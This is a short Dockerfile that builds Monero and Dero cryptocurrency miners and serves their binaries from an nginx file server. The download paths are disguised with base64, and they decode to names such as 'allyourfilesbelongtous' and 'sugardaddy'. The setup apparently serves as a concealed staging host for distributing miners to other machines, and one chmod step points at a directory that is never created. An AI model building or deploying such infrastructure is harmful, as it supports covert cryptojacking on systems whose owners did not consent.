# Stage 1: Build Monero
FROM monerominer AS monero1

# Stage 2: Build Derohe miner
FROM deroheminer AS deroheminer1

# Final Stage: Build fileserver
FROM nginx:latest
RUN apt update -y
RUN apt install wget python3 -y

ARG FQDN=fileshare.yourdomain.com

COPY fileserver/$FQDN.conf /etc/nginx/conf.d/$FQDN.conf
RUN mkdir -p /opt/$FQDN/html/YWxseW91cmZpbGVzYmVsb25ndG91cw/linux/bW9uZXJv
RUN mkdir -p /opt/$FQDN/html/YWxseW91cmZpbGVzYmVsb25ndG91cw/linux/ZGVyb2hl
RUN chmod -R 755 /opt/$FQDN/html/c3VnYXJkYWRkeQo/decodeme

#COPY # Remember to copy /usr/share/nginx/html into 

WORKDIR /opt/$FQDN/html/YWxseW91cmZpbGVzYmVsb25ndG91cw/linux
#WORKDIR /usr/share/nginx/html/YWxseW91cmZpbGVzYmVsb25ndG91cw/linux

# Copy artifacts
COPY --from=monero1 /root/build/ /opt/$FQDN/html/YWxseW91cmZpbGVzYmVsb25ndG91cw/linux/bW9uZXJv
COPY --from=deroheminer1 /root/build/ /opt/$FQDN/html/YWxseW91cmZpbGVzYmVsb25ndG91cw/linux/ZGVyb2hl
